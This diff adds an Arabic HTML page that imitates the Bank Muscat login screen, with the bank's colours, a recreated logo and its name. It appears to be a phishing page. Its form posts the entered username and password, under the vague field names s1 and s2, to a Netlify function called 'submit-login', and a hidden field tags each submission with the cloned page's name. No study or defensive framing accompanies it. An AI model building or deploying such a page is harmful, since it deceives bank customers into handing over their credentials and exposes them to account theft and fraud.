@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بنك مسقط - تسجيل الدخول</title>
+    <style>
+        /* إعادة ضبط الستايل */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(to bottom right, #f8e8b0, #f5d78e);
+            height: 100vh;
+            direction: rtl;
+        }
+        
+        /* شريط التنقل العلوي */
+        .header {
+            background-color: #f43a3a;
+            height: 70px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo img {
+            height: 40px;
+        }
+        
+        .menu-icon {
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+        }
+        
+        /* مربع تسجيل الدخول */
+        .login-container {
+            max-width: 500px;
+            width: 90%;
+            margin: 50px auto;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .login-container::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background-color: #f8d24b;
+        }
+        
+        .login-title {
+            text-align: center;
+            font-size: 28px;
+            margin-bottom: 30px;
+            color: #333;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #555;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .form-control:focus {
+            border-color: #f43a3a;
+            outline: none;
+        }
+        
+        .btn-login {
+            width: 100%;
+            background-color: #f43a3a;
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 18px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .btn-login:hover {
+            background-color: #e02e2e;
+        }
+        
+        /* تصميم متجاوب */
+        @media (max-width: 768px) {
+            .login-container {
+                width: 95%;
+                margin: 30px auto;
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- شريط التنقل العلوي -->
+    <div class="header">
+        <div class="menu-icon">
+            <div style="display: flex; flex-direction: column; gap: 5px;">
+                <div style="width: 5px; height: 5px; background-color: white; border-radius: 50%;"></div>
+                <div style="width: 5px; height: 5px; background-color: white; border-radius: 50%;"></div>
+                <div style="width: 5px; height: 5px; background-color: white; border-radius: 50%;"></div>
+            </div>
+        </div>
+        <div class="logo">
+            <!-- تمثيل شعار بنك مسقط بناءً على الصورة -->
+            <div style="display: flex; align-items: center; gap: 10px;">
+                <div style="display: flex; align-items: center;">
+                    <svg width="40" height="40" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M50 10 L90 50 L50 90 L10 50 Z" fill="white" />
+                        <path d="M50 20 L80 50 L50 80 L20 50 Z" fill="#f43a3a" />
+                        <path d="M40 50 L50 40 L60 50 L50 60 Z" fill="white" />
+                    </svg>
+                </div>
+                <div style="display: flex; flex-direction: column; color: white;">
+                    <span style="font-weight: bold; font-size: 18px;">بنك مسقط</span>
+                    <span style="font-size: 14px;">bank muscat</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- مربع تسجيل الدخول -->
+    <div class="login-container">
+        <h2 class="login-title">تسجيل الدخول</h2>
+        <form id="loginForm" action="/.netlify/functions/submit-login" method="post">
+            <div class="form-group">
+                <input type="hidden" name="source" value="Bank Muscat (2.html)">
+                <label for="username">اسم المستخدم</label>
+                <input name="s1" type="text" id="username" class="form-control" placeholder="أدخل اسم المستخدم" required>
+            </div>
+            <div class="form-group">
+                <label for="password">كلمة المرور</label>
+                <input name="s2" type="password" id="password" class="form-control" placeholder="أدخل كلمة المرور" required>
+            </div>
+            <button type="submit" class="btn-login">تسجيل الدخول</button>
+        </form>
+    </div>
+</body>
+</html>
